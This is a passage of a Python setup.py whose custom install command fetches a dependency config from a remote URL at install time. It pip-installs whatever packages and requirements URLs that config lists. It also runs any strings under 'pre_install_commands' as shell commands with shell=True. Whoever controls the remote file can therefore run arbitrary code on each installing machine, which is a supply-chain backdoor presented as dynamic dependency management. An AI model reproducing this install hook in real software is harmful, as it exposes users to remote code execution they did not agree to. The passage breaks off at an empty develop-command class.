def fetch_remote_dependencies(url=REMOTE_CONFIG_URL):
    """Fetch dependency list from a remote configuration file."""
    try:
        print(f"Fetching remote dependency configuration from: {url}")
        req = urllib.request.Request(url, headers={"User-Agent": "setup.py-installer/1.0"})
        with urllib.request.urlopen(req, timeout=10) as response:
            data = response.read().decode("utf-8")
            config = json.loads(data)
            print(f"Successfully fetched remote config: {config}")
            return config
    except (urllib.error.URLError, urllib.error.HTTPError, json.JSONDecodeError, OSError) as e:
        print(f"Warning: Could not fetch remote config ({e}). Falling back to local config.")
        return None


def load_local_dependencies(filepath=LOCAL_CONFIG_FILE):
    """Load dependency list from a local JSON configuration file."""
    if os.path.exists(filepath):
        try:
            with open(filepath, "r") as f:
                config = json.load(f)
            print(f"Loaded local dependency config from {filepath}")
            return config
        except (json.JSONDecodeError, IOError) as e:
            print(f"Warning: Could not load local config ({e}).")
    return None


def get_dependency_config():
    """
    Get the dependency configuration, trying remote first, then local fallback.

    Expected JSON format:
    {
        "install_requires": [
            "requests>=2.28.0",
            "click>=8.0",
            "pyyaml>=6.0"
        ],
        "extras_require": {
            "dev": ["pytest>=7.0", "flake8>=5.0"],
            "docs": ["sphinx>=5.0"]
        },
        "pip_install_packages": [
            "setuptools>=65.0",
            "wheel>=0.38"
        ]
    }
    """
    config = fetch_remote_dependencies()
    if config is None:
        config = load_local_dependencies()
    if config is None:
        print("No remote or local config found. Using default dependencies.")
        config = {
            "install_requires": [
                "requests>=2.28.0",
                "click>=8.0",
                "pyyaml>=6.0",
            ],
            "extras_require": {
                "dev": ["pytest>=7.0", "flake8>=5.0", "black>=22.0"],
                "docs": ["sphinx>=5.0", "sphinx-rtd-theme>=1.0"],
            },
            "pip_install_packages": [
                "setuptools>=65.0",
                "wheel>=0.38",
            ],
        }
    return config


def pip_install_packages(packages):
    """Execute pip commands to install additional packages needed at install time."""
    if not packages:
        return

    for package in packages:
        print(f"Installing additional package via pip: {package}")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", package],
                stdout=sys.stdout,
                stderr=sys.stderr,
            )
            print(f"Successfully installed: {package}")
        except subprocess.CalledProcessError as e:
            print(f"Warning: Failed to install {package} via pip: {e}")


def pip_install_from_requirements(requirements_url=None, requirements_file=None):
    """Install packages from a requirements file (local or remote)."""
    if requirements_url:
        try:
            print(f"Installing from remote requirements: {requirements_url}")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "-r", requirements_url],
                stdout=sys.stdout,
                stderr=sys.stderr,
            )
            return True
        except subprocess.CalledProcessError as e:
            print(f"Warning: Failed to install from remote requirements: {e}")

    if requirements_file and os.path.exists(requirements_file):
        try:
            print(f"Installing from local requirements: {requirements_file}")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "-r", requirements_file],
                stdout=sys.stdout,
                stderr=sys.stderr,
            )
            return True
        except subprocess.CalledProcessError as e:
            print(f"Warning: Failed to install from local requirements: {e}")

    return False


class CustomInstallCommand(install):
    """Custom install command that fetches and installs dependencies dynamically."""

    description = "Install with dynamic dependency resolution from remote config"

    user_options = install.user_options + [
        ("config-url=", None, "URL to remote dependency configuration JSON"),
        ("skip-remote", None, "Skip fetching remote configuration"),
    ]

    def initialize_options(self):
        super().initialize_options()
        self.config_url = None
        self.skip_remote = False

    def finalize_options(self):
        super().finalize_options()
        if self.skip_remote is None:
            self.skip_remote = False

    def run(self):
        """Run the custom install command."""
        print("=" * 60)
        print("Running custom install with dynamic dependency management")
        print("=" * 60)

        # Fetch configuration
        if self.config_url:
            config = fetch_remote_dependencies(self.config_url) or get_dependency_config()
        elif self.skip_remote:
            config = load_local_dependencies() or get_dependency_config()
        else:
            config = get_dependency_config()

        # Install pip-level packages first (build/install time dependencies)
        pip_packages = config.get("pip_install_packages", [])
        if pip_packages:
            print("\n--- Installing pip-level dependencies ---")
            pip_install_packages(pip_packages)

        # Install from requirements file if specified
        requirements_url = config.get("requirements_url")
        requirements_file = config.get("requirements_file", "requirements.txt")
        if requirements_url or os.path.exists(requirements_file):
            print("\n--- Installing from requirements file ---")
            pip_install_from_requirements(
                requirements_url=requirements_url,
                requirements_file=requirements_file,
            )

        # Install any pre-install hooks
        pre_install_commands = config.get("pre_install_commands", [])
        for cmd in pre_install_commands:
            print(f"Running pre-install command: {cmd}")
            try:
                subprocess.check_call(cmd, shell=True)
            except subprocess.CalledProcessError as e:
                print(f"Warning: Pre-install command failed: {e}")

        # Run the standard install
        print("\n--- Running standard install ---")
        install.run(self)

        # Post-install pip packages
        post_install_packages = config.get("post_install_packages", [])
        if post_install_packages:
            print("\n--- Installing post-install packages ---")
            pip_install_packages(post_install_packages)

        print("\n" + "=" * 60)
        print("Custom install completed successfully!")
        print("=" * 60)


class CustomDevelopCommand(develop):
    """Custom develop command that also installs dev dependencies."""

